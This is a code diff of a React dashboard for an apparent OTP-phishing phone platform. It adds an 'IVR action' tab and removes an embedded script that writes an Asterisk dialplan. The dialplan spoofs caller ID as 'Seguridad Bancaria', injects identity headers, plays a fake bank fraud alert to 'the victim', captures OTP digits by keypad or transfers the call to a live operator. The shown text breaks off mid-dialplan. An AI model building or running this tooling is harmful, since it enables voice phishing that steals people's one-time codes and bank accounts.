@@ -46,6 +46,8 @@ import {
   Save,
   X,
   Settings2,
+  Zap,
+  ArrowRight,
 } from 'lucide-react';
 
 export interface CampaignAudioConfig {
@@ -89,8 +91,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
   onTriggerSync,
   isSyncing,
 }) => {
-  // Mode selection: individual direct launch vs bulk list
-  const [productionMode, setProductionMode] = useState<'single' | 'bulk'>('single');
+  // Mode selection: individual direct launch vs ivr action tab vs bulk list
+  const [productionMode, setProductionMode] = useState<'single' | 'ivr_action' | 'bulk'>('single');
 
   // Single launch state
   const [targetNumber, setTargetNumber] = useState('16104803845');
@@ -1059,7 +1061,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       </div>
 
       {/* Mode Selector Tabs */}
-      <div className="flex items-center space-x-2 border-b border-slate-800 pb-2">
+      <div className="flex flex-wrap items-center gap-2 border-b border-slate-800 pb-2">
         <button
           id="btn-tab-single-call"
           onClick={() => setProductionMode('single')}
@@ -1071,6 +1073,26 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
         >
           <PhoneCall className="w-4 h-4" />
           <span>Disparador Individual Inmediato (1 a 1)</span>
+        </button>
+
+        <button
+          id="btn-tab-ivr-action"
+          onClick={() => setProductionMode('ivr_action')}
+          className={`flex items-center space-x-2 px-4 py-2 rounded-lg text-xs font-bold transition-all ${
+            productionMode === 'ivr_action'
+              ? 'bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20'
+              : 'text-slate-400 hover:text-white hover:bg-slate-800'
+          }`}
+        >
+          <Zap className="w-4 h-4" />
+          <span>Acción del IVR al Contestar</span>
+          <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
+            productionMode === 'ivr_action'
+              ? 'bg-slate-950 text-emerald-400'
+              : 'bg-emerald-500/20 text-emerald-300'
+          }`}>
+            {callFlowMode === 'otp' ? 'Captura OTP' : callFlowMode === 'press1' ? 'Press-1' : 'Híbrido'}
+          </span>
         </button>
 
         <button
@@ -1637,556 +1659,105 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
                 </div>
               </div>
 
-              {/* Call Flow Mode */}
-              <div className="space-y-2">
-                <label className="text-xs font-bold text-slate-300 uppercase tracking-wider">
-                  Acción del IVR al Contestar
-                </label>
-                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
-                  <button
-                    type="button"
-                    onClick={() => setCallFlowMode('otp')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      callFlowMode === 'otp'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <KeyRound className="w-4 h-4 text-emerald-400 mb-1" />
-                    <div className="text-xs font-bold">1. Capturar Código OTP</div>
-                    <div className="text-[11px] text-slate-400 mt-0.5">
-                      Pide los 4 o 6 dígitos y los muestra en pantalla viva.
-                    </div>
-                  </button>
-
-                  <button
-                    type="button"
-                    onClick={() => setCallFlowMode('press1')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      callFlowMode === 'press1'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <PhoneForwarded className="w-4 h-4 text-emerald-400 mb-1" />
-                    <div className="text-xs font-bold">2. Press-1 (A X-Lite)</div>
-                    <div className="text-[11px] text-slate-400 mt-0.5">
-                      Si presiona 1, timbra directo en tu extensión 1001.
-                    </div>
-                  </button>
-
-                  <button
-                    type="button"
-                    onClick={() => setCallFlowMode('hybrid')}
-                    className={`p-3 rounded-xl border text-left transition-all ${
-                      callFlowMode === 'hybrid'
-                        ? 'bg-emerald-500/10 border-emerald-500 text-white'
-                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-white'
-                    }`}
-                  >
-                    <Radio className="w-4 h-4 text-sky-400 mb-1" />
-                    <div className="text-xs font-bold">3. Híbrido Completo</div>
-                    <div className="text-[11px] text-slate-400 mt-0.5">
-                      Pide el código y si presiona 1 conecta con asesor.
-                    </div>
-                  </button>
-                </div>
-              </div>
-
-              {/* ======================================================== */}
-              {/* LOCUCIONES Y AUDIOS PREGRABADOS DE LA CAMPAÑA */}
-              {/* ======================================================== */}
-              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-4">
+              {/* ACCIÓN DEL IVR AL CONTESTAR - RESUMEN COMPACTO & ACCESO A PESTAÑA DEDICADA */}
+              <div className="p-4 rounded-xl bg-slate-900/90 border border-slate-800 space-y-3">
                 <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-slate-800 pb-2.5">
                   <div className="flex items-center gap-2">
-                    <Volume2 className="w-4 h-4 text-emerald-400" />
+                    <Zap className="w-4 h-4 text-emerald-400" />
                     <div>
-                      <h4 className="text-xs font-bold text-white uppercase tracking-wider">
-                        Locuciones Pregrabadas del IVR
+                      <h4 className="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-2">
+                        <span>Acción del IVR al Contestar</span>
+                        <span className="px-2 py-0.5 rounded text-[10px] font-mono font-bold bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
+                          {callFlowMode === 'otp' ? 'Captura OTP' : callFlowMode === 'press1' ? 'Press-1 a Asesor' : 'Híbrido OTP+Press1'}
+                        </span>
                       </h4>
                       <p className="text-[11px] text-slate-400">
-                        Campaña activa: <strong className="text-emerald-300">{serviceLabel}</strong>
+                        Flujo activo que se ejecutará en Asterisk cuando la víctima conteste.
                       </p>
                     </div>
                   </div>
 
                   <button
                     type="button"
-                    onClick={() => {
-                      setQuickUploadSlot('introAudioPath');
-                      setIsQuickUploadOpen(true);
-                    }}
-                    className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold bg-emerald-500/10 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/20 transition-all self-start sm:self-auto"
+                    onClick={() => setProductionMode('ivr_action')}
+                    className="px-3.5 py-1.5 rounded-lg bg-emerald-500/15 hover:bg-emerald-500/25 text-emerald-300 border border-emerald-500/40 text-xs font-bold flex items-center gap-1.5 transition-all self-start sm:self-auto shadow-sm"
                   >
-                    <Plus className="w-3.5 h-3.5" />
-                    <span>+ Subir / Grabar Audio</span>
+                    <span>Abrir en Pestaña Completa (Más Espacio)</span>
+                    <ArrowRight className="w-3.5 h-3.5" />
                   </button>
                 </div>
 
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
-                  {/* Slot 1: Audio de Bienvenida / Alerta de Fraude */}
-                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
-                    <div className="flex items-center justify-between">
-                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
-                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
-                        <span>1. Saludo / Alerta Inicial</span>
-                      </label>
-                      <button
-                        type="button"
-                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].introAudioPath, 'intro')}
-                        disabled={!campaignAudios[selectedService].introAudioPath}
-                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
-                        title="Escuchar audio"
-                      >
-                        {playingAudioKey === 'intro' ? (
-                          <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
-                        ) : (
-                          <Play className="w-3.5 h-3.5 text-slate-300" />
-                        )}
-                      </button>
+                {/* Selector Rápido de 3 Modos */}
+                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
+                  <button
+                    type="button"
+                    onClick={() => setCallFlowMode('otp')}
+                    className={`p-2.5 rounded-xl border text-left transition-all ${
+                      callFlowMode === 'otp'
+                        ? 'bg-emerald-500/15 border-emerald-500 text-white shadow-sm'
+                        : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                    }`}
+                  >
+                    <div className="flex items-center gap-1.5 font-bold text-xs">
+                      <KeyRound className="w-3.5 h-3.5 text-emerald-400 shrink-0" />
+                      <span>1. Modo OTP</span>
                     </div>
-                    <select
-                      value={campaignAudios[selectedService].introAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
-                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
-                    >
-                      <option value="">-- Beep estándar de Asterisk --</option>
-                      <option value={`custom/alerta_${selectedService}`}>custom/alerta_{selectedService} (Recomendado)</option>
-                      {audios.map((a) => (
-                        <option key={a.id} value={a.asteriskPath}>
-                          {a.name} ({a.asteriskPath})
-                        </option>
-                      ))}
-                    </select>
-                    <input
-                      type="text"
-                      value={campaignAudios[selectedService].introAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'introAudioPath', e.target.value)}
-                      placeholder="o escribe ruta (ej: custom/mi_audio)"
-                      className="w-full px-2.5 py-1 bg-slate-900/80 border border-slate-700/60 rounded text-[11px] text-slate-300 font-mono focus:border-emerald-500 focus:outline-none"
-                    />
-                    <div className="text-[10px] text-slate-500 font-mono truncate">
-                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].introAudioPath || 'beep'}.wav
+                    <div className="text-[10px] text-slate-400 mt-1 truncate">
+                      Pide token y captura dígitos DTMF
                     </div>
-                  </div>
+                  </button>
 
-                  {/* Slot 2: Solicitud de Código OTP */}
-                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
-                    <div className="flex items-center justify-between">
-                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
-                        <span className="w-1.5 h-1.5 rounded-full bg-emerald-400"></span>
-                        <span>2. Solicitud de Código OTP</span>
-                      </label>
-                      <button
-                        type="button"
-                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].promptAudioPath, 'prompt')}
-                        disabled={!campaignAudios[selectedService].promptAudioPath}
-                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
-                        title="Escuchar audio"
-                      >
-                        {playingAudioKey === 'prompt' ? (
-                          <Pause className="w-3.5 h-3.5 text-emerald-400 animate-pulse" />
-                        ) : (
-                          <Play className="w-3.5 h-3.5 text-slate-300" />
-                        )}
-                      </button>
+                  <button
+                    type="button"
+                    onClick={() => setCallFlowMode('press1')}
+                    className={`p-2.5 rounded-xl border text-left transition-all ${
+                      callFlowMode === 'press1'
+                        ? 'bg-sky-500/15 border-sky-500 text-white shadow-sm'
+                        : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                    }`}
+                  >
+                    <div className="flex items-center gap-1.5 font-bold text-xs">
+                      <PhoneForwarded className="w-3.5 h-3.5 text-sky-400 shrink-0" />
+                      <span>2. Modo Press-1</span>
                     </div>
-                    <select
-                      value={campaignAudios[selectedService].promptAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
-                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-emerald-500 font-mono"
-                    >
-                      <option value="">-- Beep estándar (espera dígitos) --</option>
-                      <option value="custom/prompt_otp_6_digitos">custom/prompt_otp_6_digitos ("Por favor digite su TOKEN de 6 dígitos") [RECOMENDADO]</option>
-                      <option value="custom/digite_token_6_digitos">custom/digite_token_6_digitos ("Por favor digite su TOKEN de 6 dígitos")</option>
-                      <option value="custom/solicitar_codigo_otp">custom/solicitar_codigo_otp (Estándar)</option>
-                      <option value={`custom/solicitar_otp_${selectedService}`}>custom/solicitar_otp_{selectedService}</option>
-                      {audios.map((a) => (
-                        <option key={a.id} value={a.asteriskPath}>
-                          {a.name} ({a.asteriskPath})
-                        </option>
-                      ))}
-                    </select>
-                    <input
-                      type="text"
-                      value={campaignAudios[selectedService].promptAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'promptAudioPath', e.target.value)}
-                      placeholder="o escribe ruta (ej: custom/solicitar_otp)"
-                      className="w-full px-2.5 py-1 bg-slate-900/80 border border-slate-700/60 rounded text-[11px] text-slate-300 font-mono focus:border-emerald-500 focus:outline-none"
-                    />
-                    <div className="text-[10px] text-slate-500 font-mono truncate">
-                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].promptAudioPath || 'beep'}.wav
+                    <div className="text-[10px] text-slate-400 mt-1 truncate">
+                      Presiona 1 → Extensión {agentExtension}
                     </div>
-                  </div>
+                  </button>
 
-                  {/* Slot 3: Transferencia Press-1 (Asesor) */}
-                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
-                    <div className="flex items-center justify-between">
-                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
-                        <span className="w-1.5 h-1.5 rounded-full bg-sky-400"></span>
-                        <span>3. Transferencia Press 1</span>
-                      </label>
-                      <button
-                        type="button"
-                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].agentAudioPath, 'agent')}
-                        disabled={!campaignAudios[selectedService].agentAudioPath}
-                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
-                        title="Escuchar audio"
-                      >
-                        {playingAudioKey === 'agent' ? (
-                          <Pause className="w-3.5 h-3.5 text-sky-400 animate-pulse" />
-                        ) : (
-                          <Play className="w-3.5 h-3.5 text-slate-300" />
-                        )}
-                      </button>
+                  <button
+                    type="button"
+                    onClick={() => setCallFlowMode('hybrid')}
+                    className={`p-2.5 rounded-xl border text-left transition-all ${
+                      callFlowMode === 'hybrid'
+                        ? 'bg-purple-500/15 border-purple-500 text-white shadow-sm'
+                        : 'bg-slate-950 border-slate-800 text-slate-400 hover:text-white'
+                    }`}
+                  >
+                    <div className="flex items-center gap-1.5 font-bold text-xs">
+                      <Radio className="w-3.5 h-3.5 text-purple-400 shrink-0" />
+                      <span>3. Modo Híbrido</span>
                     </div>
-                    <select
-                      value={campaignAudios[selectedService].agentAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
-                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-sky-500 font-mono"
-                    >
-                      <option value="">-- Sin audio previo (Directo a X-Lite) --</option>
-                      <option value="custom/conectar_asesor">custom/conectar_asesor ("Transfiriendo...")</option>
-                      <option value={`custom/conectar_asesor_${selectedService}`}>custom/conectar_asesor_{selectedService}</option>
-                      {audios.map((a) => (
-                        <option key={a.id} value={a.asteriskPath}>
-                          {a.name} ({a.asteriskPath})
-                        </option>
-                      ))}
-                    </select>
-                    <input
-                      type="text"
-                      value={campaignAudios[selectedService].agentAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'agentAudioPath', e.target.value)}
-                      placeholder="o escribe ruta (ej: custom/conectar_asesor)"
-                      className="w-full px-2.5 py-1 bg-slate-900/80 border border-slate-700/60 rounded text-[11px] text-slate-300 font-mono focus:border-sky-500 focus:outline-none"
-                    />
-                    <div className="text-[10px] text-slate-500 font-mono truncate">
-                      Conecta con: Extensión {agentExtension} (Softphone X-Lite)
+                    <div className="text-[10px] text-slate-400 mt-1 truncate">
+                      Captura token o conecta si presiona 1
                     </div>
-                  </div>
-
-                  {/* Slot 4: Despedida / Éxito OTP */}
-                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
-                    <div className="flex items-center justify-between">
-                      <label className="text-[11px] font-bold text-slate-300 flex items-center gap-1.5">
-                        <span className="w-1.5 h-1.5 rounded-full bg-purple-400"></span>
-                        <span>4. Confirmación / Éxito OTP</span>
-                      </label>
-                      <button
-                        type="button"
-                        onClick={() => handleTogglePlayAudio(campaignAudios[selectedService].successAudioPath, 'success')}
-                        disabled={!campaignAudios[selectedService].successAudioPath}
-                        className="p-1 rounded bg-slate-800 text-slate-300 hover:text-white disabled:opacity-30 transition-all"
-                        title="Escuchar audio"
-                      >
-                        {playingAudioKey === 'success' ? (
-                          <Pause className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
-                        ) : (
-                          <Play className="w-3.5 h-3.5 text-slate-300" />
-                        )}
-                      </button>
-                    </div>
-                    <select
-                      value={campaignAudios[selectedService].successAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
-                      className="w-full px-2.5 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-xs text-white focus:outline-none focus:border-purple-500 font-mono"
-                    >
-                      <option value="">-- SayDigits (repite dígitos capturados) --</option>
-                      <option value="custom/operacion_bloqueada_exito">custom/operacion_bloqueada_exito</option>
-                      <option value="auth-thankyou">auth-thankyou (Asterisk nativo)</option>
-                      {audios.map((a) => (
-                        <option key={a.id} value={a.asteriskPath}>
-                          {a.name} ({a.asteriskPath})
-                        </option>
-                      ))}
-                    </select>
-                    <input
-                      type="text"
-                      value={campaignAudios[selectedService].successAudioPath}
-                      onChange={(e) => handleUpdateCampaignAudio(selectedService, 'successAudioPath', e.target.value)}
-                      placeholder="o escribe ruta (ej: custom/operacion_bloqueada_exito)"
-                      className="w-full px-2.5 py-1 bg-slate-900/80 border border-slate-700/60 rounded text-[11px] text-slate-300 font-mono focus:border-purple-500 focus:outline-none"
-                    />
-                    <div className="text-[10px] text-slate-500 font-mono truncate">
-                      Ruta: /var/lib/asterisk/sounds/{campaignAudios[selectedService].successAudioPath || 'SayDigits'}.wav
-                    </div>
-                  </div>
+                  </button>
                 </div>
 
-                {/* Botón de Sincronización Inmediata con Asterisk AstDB */}
-                <div className="pt-2 flex flex-col sm:flex-row items-center justify-between gap-3 border-t border-slate-800">
-                  <div className="text-[11px] text-slate-400">
-                    Sincroniza los audios seleccionados en la base de datos de Asterisk para asegurar que suenen en llamadas y pruebas (8888).
+                {/* Resumen de Audios y Enlace Directo */}
+                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pt-1 text-[11px] text-slate-400">
+                  <div className="flex items-center gap-2 truncate">
+                    <Volume2 className="w-3.5 h-3.5 text-slate-500 shrink-0" />
+                    <span>Locución actual: <code className="text-slate-300 font-mono">{campaignAudios[selectedService]?.promptAudioPath || 'custom/prompt_otp_6_digitos'}</code></span>
                   </div>
-                  <div className="flex items-center gap-2 w-full sm:w-auto">
-                    {audioSyncFeedback && (
-                      <span className="text-xs font-semibold text-emerald-400 animate-fade-in">
-                        {audioSyncFeedback}
-                      </span>
-                    )}
-                    <button
-                      id="btn-sync-audios-astdb"
-                      type="button"
-                      onClick={() => handleSyncAudiosToAsterisk(false)}
-                      disabled={isSyncingAudios}
-                      className="px-4 py-2 rounded-lg bg-emerald-600/20 hover:bg-emerald-600/30 text-emerald-300 border border-emerald-500/40 text-xs font-bold flex items-center gap-1.5 transition-all w-full sm:w-auto justify-center"
-                    >
-                      <RefreshCw className={`w-3.5 h-3.5 ${isSyncingAudios ? 'animate-spin' : ''}`} />
-                      <span>{isSyncingAudios ? 'Sincronizando...' : 'Sincronizar Audios con Asterisk'}</span>
-                    </button>
-                  </div>
-                </div>
-
-                {/* Sincronización Directa de 1 Línea para la Terminal del Servidor VPS (vmi3461829) */}
-                <div className="mt-3 p-3 rounded-lg bg-slate-950/90 border border-amber-500/30 space-y-2">
-                  <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-2">
-                    <div className="flex items-center gap-2">
-                      <Terminal className="w-4 h-4 text-amber-400 shrink-0" />
-                      <span className="text-xs font-bold text-amber-300">
-                        Script Autónomo para Aplicar en tu Servidor VPS (vmi3461829)
-                      </span>
-                    </div>
-                    <div className="flex items-center gap-2">
-                      <button
-                        type="button"
-                        onClick={() => {
-                          const fullScript = `cat << 'EOF' > /etc/asterisk/extensions.conf
-; ========================================================
-; DIALPLAN DE LLAMADAS INTERNAS Y SALIENTES VIA PJSIP
-; Auto-generado por Anonymous OTP Asterisk Platform
-; ========================================================
-
-[general]
-static=yes
-writeprotect=no
-
-[globals]
-GLOBAL_CARRIER_HOST=162.248.51.10
-GLOBAL_DEFAULT_INTRO=custom/alerta_banco_antifraude
-GLOBAL_DEFAULT_PROMPT=custom/solicitar_codigo_otp
-GLOBAL_DEFAULT_WAIT=custom/un_momento_validando_informacion
-GLOBAL_DEFAULT_SUCCESS=custom/operacion_bloqueada_exito
-GLOBAL_DEFAULT_AGENT=custom/conectar_asesor_banco
-
-; Subrutina Pre-Dial para inyectar cabeceras PJSIP en canal saliente real
-[sub-pjsip-headers]
-exten => s,1,NoOp(=== Inyectando PJSIP Headers en Canal Saliente: \${CHANNEL} ===)
- same => n,Set(PJSIP_HEADER(add,Privacy)=none)
- same => n,Set(PJSIP_HEADER(add,P-Asserted-Identity)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>)
- same => n,Set(PJSIP_HEADER(add,Remote-Party-ID)=<sip:\${CALLERID(num)}@\${GLOBAL_CARRIER_HOST}>;party=calling;screen=yes;privacy=off)
- same => n,Return()
-
-[from-internal]
-; 1. Llamadas internas entre extensiones (1001-1999)
-exten => _1XXX,1,NoOp(Llamada interna a extension \${EXTEN})
- same => n,Dial(PJSIP/\${EXTEN},30,Tt)
- same => n,Hangup()
-
-; 2. Acceso y Prueba Directa IVR desde Softphone X-Lite (Extension 8888)
-exten => 8888,1,NoOp(=== PRUEBA DIRECTA IVR EXT 8888 ===)
- same => n,Set(IS_TEST_CALL=1)
- same => n,Set(CALL_DEST=8888)
- same => n,Set(CALLING_AGENT=\${CALLERID(num)})
- same => n,Set(IVR_AGENT_EXTEN=1001)
- same => n,Goto(ivr-otp,s,1)
-
-; 2b. Acceso a Simulador IVR Local (*8888 o 8880)
-exten => *8888,1,Goto(8888,1)
-exten => 8880,1,Goto(8888,1)
-
-; 3. Regla Saliente USA / Canada 11 digitos (ej. 16104803845)
-exten => _1NXXNXXXXXX,1,NoOp(Llamada Saliente 11 digitos a \${EXTEN} via televox)
- same => n,Set(CALLING_AGENT=\${CALLERID(num)})
- same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
- same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
- same => n,Set(CALLERID(pres)=allowed_passed_screen)
- same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
- same => n,NoOp(Marcando \${EXTEN} por troncal televox con CallerID \${CALLERID(all)})
- same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
- same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)
- same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)
- same => n,NoOp(Fallback Intento 2 con +: +\${EXTEN})
- same => n,Dial(PJSIP/+\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
- same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial11_done)
- same => n,GotoIf($["\${DIALSTATUS}" = "BUSY"]?dial11_busy)
- same => n,NoOp(Fallback Intento 3 a 10 digitos: \${EXTEN:1})
- same => n,Dial(PJSIP/\${EXTEN:1}@televox,60,Ttb(sub-pjsip-headers^s^1))
- same => n(dial11_done),Hangup()
- same => n(dial11_busy),Playtones(busy)
- same => n,Wait(3)
- same => n,Hangup()
-
-; 4. Regla Saliente 10 digitos (antepone 1)
-exten => _NXXNXXXXXX,1,NoOp(Llamada Saliente 10 digitos a 1\${EXTEN} via televox)
- same => n,Set(CALLING_AGENT=\${CALLERID(num)})
- same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
- same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
- same => n,Set(CALLERID(pres)=allowed_passed_screen)
- same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
- same => n,Dial(PJSIP/1\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
- same => n,GotoIf($["\${DIALSTATUS}" = "ANSWER"]?dial10_done)
- same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
- same => n(dial10_done),Hangup()
-
-; 5. Regla Saliente Generica para cualquier otro numero saliente
-exten => _X.,1,NoOp(Llamada Saliente a \${EXTEN} via televox)
- same => n,Set(CALLING_AGENT=\${CALLERID(num)})
- same => n,Set(AGENT_CUSTOM_CID_NUM=\${DB(extension_cid/\${CALLING_AGENT}/number)})
- same => n,Set(AGENT_CUSTOM_CID_NAME=\${DB(extension_cid/\${CALLING_AGENT}/name)})
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${AGENT_CUSTOM_CID_NUM}):Set(CALLERID(num)=+18005550199))
- same => n,ExecIf($["\${AGENT_CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${AGENT_CUSTOM_CID_NAME}):Set(CALLERID(name)=Seguridad Bancaria))
- same => n,Set(CALLERID(pres)=allowed_passed_screen)
- same => n,Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>)
- same => n,Dial(PJSIP/\${EXTEN}@televox,60,Ttb(sub-pjsip-headers^s^1))
- same => n,Hangup()
-
-[trunkinbound]
-exten => _X.,1,NoOp(Llamada Entrante por Troncal: \${CALLERID(num)})
- same => n,Goto(ivr-otp,s,1)
-
-; ========================================================
-; CONTEXTO IVR INTERACTIVO CON AUDIOS PREGRABADOS
-; ========================================================
-[ivr-otp]
-exten => s,1,NoOp(=== IVR INTERACTIVO CON AUDIOS PREGRABADOS ===)
- same => n,Answer()
- same => n,Wait(1)
- same => n,Set(TARGET_DEST=\${IF($["\${CALL_DEST}" != ""]?\${CALL_DEST}:\${CALLERID(num)})})
- same => n,Set(CUSTOM_CID_NUM=\${DB(ivr_vars/\${TARGET_DEST}_cid_num)})
- same => n,Set(CUSTOM_CID_NAME=\${DB(ivr_vars/\${TARGET_DEST}_cid_name)})
- same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(num)=\${CUSTOM_CID_NUM}))
- same => n,ExecIf($["\${CUSTOM_CID_NAME}" != ""]?Set(CALLERID(name)=\${CUSTOM_CID_NAME}))
- same => n,ExecIf($["\${CUSTOM_CID_NUM}" != ""]?Set(CALLERID(all)="\${CALLERID(name)}" <\${CALLERID(num)}>))
- 
- same => n,Set(IVR_INTRO=\${DB(ivr_vars/\${TARGET_DEST}_intro)})
- same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/8888_intro)}))
- same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${DB(ivr_vars/default_intro)}))
- same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=\${GLOBAL_DEFAULT_INTRO}))
- same => n,ExecIf($["\${IVR_INTRO}" = ""]?Set(IVR_INTRO=custom/alerta_banco_antifraude))
-
- same => n,Set(IVR_PROMPT=\${DB(ivr_vars/\${TARGET_DEST}_prompt)})
- same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/8888_prompt)}))
- same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${DB(ivr_vars/default_prompt)}))
- same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=\${GLOBAL_DEFAULT_PROMPT}))
- same => n,ExecIf($["\${IVR_PROMPT}" = ""]?Set(IVR_PROMPT=custom/solicitar_codigo_otp))
-
- same => n,Set(IVR_WAIT=\${DB(ivr_vars/\${TARGET_DEST}_wait)})
- same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/8888_wait)}))
- same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${DB(ivr_vars/default_wait)}))
- same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=\${GLOBAL_DEFAULT_WAIT}))
- same => n,ExecIf($["\${IVR_WAIT}" = ""]?Set(IVR_WAIT=custom/un_momento_validando_informacion))
-
- same => n,Set(IVR_SUCCESS=\${DB(ivr_vars/\${TARGET_DEST}_success)})
- same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/8888_success)}))
- same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${DB(ivr_vars/default_success)}))
- same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=\${GLOBAL_DEFAULT_SUCCESS}))
- same => n,ExecIf($["\${IVR_SUCCESS}" = ""]?Set(IVR_SUCCESS=custom/operacion_bloqueada_exito))
-
- same => n,Set(IVR_AGENT=\${DB(ivr_vars/\${TARGET_DEST}_agent)})
